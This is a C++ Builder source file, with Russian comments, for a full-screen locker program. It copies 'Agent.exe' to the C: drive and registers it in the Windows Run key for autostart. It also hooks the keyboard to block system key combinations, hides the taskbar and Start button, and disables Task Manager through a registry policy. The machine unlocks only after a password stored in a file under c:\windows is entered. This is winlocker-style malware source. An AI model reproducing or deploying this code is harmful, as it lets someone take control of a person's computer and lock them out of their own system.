//---------------------------------------------------------------------------

#include <vcl.h>
#pragma hdrstop

#include "Unit16.h"
#include "registry.hpp"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
TForm16 *Form16;
//---------------------------------------------------------------------------
__fastcall TForm16::TForm16(TComponent* Owner)
	: TForm(Owner)
{
}
//---------------------------------------------------------------------------

//Блокировка системных клавиш
int __stdcall KeyboardProc(int nCode, DWORD wParam,DWORD lParam)
{
	HHOOK hHook;
	static bool KeyStroke;
	static KBDLLHOOKSTRUCT *p;

	if(nCode < 0)
		return (int)CallNextHookEx(NULL, nCode, wParam, lParam);

	KeyStroke = false;
	if(nCode == HC_ACTION)
    	{
			switch(wParam)
            	{
					case WM_KEYDOWN:
					case WM_SYSKEYDOWN:
					case WM_KEYUP:
					case WM_SYSKEYUP:
						p = (KBDLLHOOKSTRUCT *)lParam;
						KeyStroke = ((p->vkCode = VK_LWIN) || (p->vkCode == VK_RWIN)) ||
									((p->vkCode == VK_TAB) && ((p->flags & LLKHF_ALTDOWN) != 0));// ||
													((p->vkCode == VK_ESCAPE) && ((p->flags & LLKHF_ALTDOWN) != 0)) ||
									((p->vkCode == VK_ESCAPE) && ((GetKeyState(VK_CONTROL) & 0x8000) != 0)) ||
									((p->vkCode == VK_F4) && ((p->flags & LLKHF_ALTDOWN) != 0));// ||
									((p->vkCode == 0xC0) && ((MOD_CONTROL + 0x10) != 0));
						break;
					default:
						break;
				}
		}
	if(KeyStroke)
		return 777;
	else
    	return (int)CallNextHookEx(hHook, nCode, wParam, lParam);
}

//---------------------------------------------------------------------------
void __fastcall TForm16::FormCreate(TObject *Sender)
{
if(FileExists("c:\\windows\\gl.obg"))
	Memo1->Lines->LoadFromFile("c:\\windows\\gl.obg");
else
	Form16->Close();
//копируем агента на диск C:
CopyFile("Agent.exe","c:\\Agent.exe",false);
//прописываем в автозапуск
TRegistry *reg = new TRegistry();
reg->RootKey = HKEY_CURRENT_USER;
reg->OpenKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",true);
reg->WriteString("Farnsoft","\"C:\\Agent.exe\"");
reg->CloseKey();
//При загрузке программы - активация хука
try
	{
		//hHook =
		SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)&KeyboardProc, GetModuleHandle(NULL), 0);
	}
catch(...)
	{
		;
	}
}
//----------------------------------------------------------------------------

void __fastcall TForm16::FormActivate(TObject *Sender)
{
//прячем панель задач и кнопку Пуск
ShowWindow(FindWindow("Shell_TrayWnd",NULL),SW_HIDE);
ShowWindow(FindWindow("Button",NULL),SW_HIDE);
//настройка экрана
Form16->Width = Screen->Width;
Form16->Height = Screen->Height;
Form16->Top = 0;
Form16->Left = 0;
Form16->BorderStyle = 0;
Label1->Top = Form16->Top + 20;
Label1->Font->Size = Screen->Width/Label1->Caption.Length();
Label1->Left = (Screen->Width - Label1->Width)/2;
//Label2->Top = Form16->Height - 80;
//Label2->Left = (Screen->Width - Label2->Width)/2;
Edit1->Left = (Screen->Width - Edit1->Width)/2 - 30;
Button1->Left = Edit1->Left + Edit1->Width + 30;
Button3->Left = Edit1->Left;
Button4->Left = Button3->Left + Button3->Width + 1;
Button5->Left = Button4->Left + Button4->Width + 1;
Button6->Left = Edit1->Left;
Button7->Left = Button6->Left + Button6->Width + 1;
Button8->Left = Button7->Left + Button7->Width + 1;
Button9->Left = Edit1->Left;
Button10->Left = Button9->Left + Button9->Width + 1;
Button11->Left = Button10->Left + Button10->Width + 1;
Button12->Left = Edit1->Left;
Button13->Left = Button12->Left + Button12->Width + 1;

//блокировка диспетчера задач
TRegistry *reg;
reg = new TRegistry;
reg->RootKey = HKEY_CURRENT_USER;
reg->OpenKey("Software",true);
reg->OpenKey("Microsoft",true);
reg->OpenKey("Windows",true);
reg->OpenKey("CurrentVersion",true);
reg->OpenKey("Policies",true);
reg->OpenKey("System",true);
reg->WriteString("DisableTaskMgr","1");
//1 - блок, отключение блокировки (null)
reg->CloseKey();
// пароль
Edit1->Clear();
Edit1->Font->Color = clBlack;
Edit1->PasswordChar = '\*';
if(FileExists("c:\\windows\\gl.obg"))
	Memo1->Lines->LoadFromFile("c:\\windows\\gl.obg");
else
	return;
}
//---------------------------------------------------------------------------
void __fastcall TForm16::FormDestroy(TObject *Sender)
{
//восстанавливаем панель задач и кнопку пуск
ShowWindow(FindWindow("Shell_TrayWnd",NULL),SW_SHOW);
ShowWindow(FindWindow("Button",NULL),SW_HIDE);
}
//---------------------------------------------------------------------------
void __fastcall TForm16::Button1Click(TObject *Sender)
{

//пароль введен правильно
if(Edit1->Text == Memo1->Lines->Strings[0])
{
//удаляем агента
DeleteFile("c:\\Agent.exe");
//разблокировка диспетчера задач
TRegistry *reg;
reg = new TRegistry;
reg->RootKey = HKEY_CURRENT_USER;
reg->OpenKey("Software",true);
reg->OpenKey("Microsoft",true);
reg->OpenKey("Windows",true);
reg->OpenKey("CurrentVersion",true);
reg->OpenKey("Policies",true);
reg->OpenKey("System",true);
// отключение блокировки (null)
reg->WriteString("DisableTaskMgr","null");
reg->CloseKey();
//извлекаем из автозапуска
reg->RootKey = HKEY_CURRENT_USER;
reg->OpenKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",true);
reg->DeleteValue("Farnsoft");
reg->CloseKey();
Form16->Close(); //или system("taskkill /IM Agent.exe");
ShellExecute(Handle,NULL,"Explor.exe",NULL,NULL,SW_RESTORE);
}
else
MessageBox(NULL,"ERROR","Ошибка",MB_ICONSTOP);
}
//---------------------------------------------------------------------------

void __fastcall TForm16::Timer1Timer(TObject *Sender)
{
Timer1->Interval = 500;
if(Label1->Visible == true)
	Label1->Visible = false;
else
	Label1->Visible = true;
}
//---------------------------------------------------------------------------

void __fastcall TForm16::Button2Click(TObject *Sender)
{
//удаляем агента
DeleteFile("c:\\Agent.exe");
//разблокировка диспетчера задач
TRegistry *reg;
reg = new TRegistry;
reg->RootKey = HKEY_CURRENT_USER;
reg->OpenKey("Software",true);
reg->OpenKey("Microsoft",true);
reg->OpenKey("Windows",true);
reg->OpenKey("CurrentVersion",true);
reg->OpenKey("Policies",true);
reg->OpenKey("System",true);
// отключение блокировки (null)
reg->WriteString("DisableTaskMgr","null");
reg->CloseKey();
//извлекаем из автозапуска
reg->RootKey = HKEY_CURRENT_USER;
reg->OpenKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",true);
reg->DeleteValue("Farnsoft");
reg->CloseKey();
Form16->Close(); //или system("taskkill /IM Agent.exe");
ShellExecute(Handle,NULL,"Explor.exe",NULL,NULL,SW_RESTORE);
}
//---------------------------------------------------------------------------

void __fastcall TForm16::Button3Click(TObject *Sender)
{
Edit1->Text = Edit1->Text + "1";	
}
//---------------------------------------------------------------------------

void __fastcall TForm16::Button4Click(TObject *Sender)
{
Edit1->Text = Edit1->Text + "2";	
}
//---------------------------------------------------------------------------

void __fastcall TForm16::Button5Click(TObject *Sender)
{
Edit1->Text = Edit1->Text + "3";	
}
//---------------------------------------------------------------------------

void __fastcall TForm16::Button6Click(TObject *Sender)
{
Edit1->Text = Edit1->Text + "4";	
}
//---------------------------------------------------------------------------

void __fastcall TForm16::Button7Click(TObject *Sender)
{
Edit1->Text = Edit1->Text + "5";	
}
//---------------------------------------------------------------------------

void __fastcall TForm16::Button8Click(TObject *Sender)
{
Edit1->Text = Edit1->Text + "6";
}
//---------------------------------------------------------------------------

void __fastcall TForm16::Button9Click(TObject *Sender)
{
Edit1->Text = Edit1->Text + "7";
}
//---------------------------------------------------------------------------

void __fastcall TForm16::Button10Click(TObject *Sender)
{
Edit1->Text = Edit1->Text + "8";
}
//---------------------------------------------------------------------------


void __fastcall TForm16::Button11Click(TObject *Sender)
{
Edit1->Text = Edit1->Text + "9";
}
//---------------------------------------------------------------------------

void __fastcall TForm16::Button13Click(TObject *Sender)
{
Edit1->Text = Edit1->Text + "0";	
}
//---------------------------------------------------------------------------

void __fastcall TForm16::Button12Click(TObject *Sender)
{
Edit1->Clear();	
}
//---------------------------------------------------------------------------

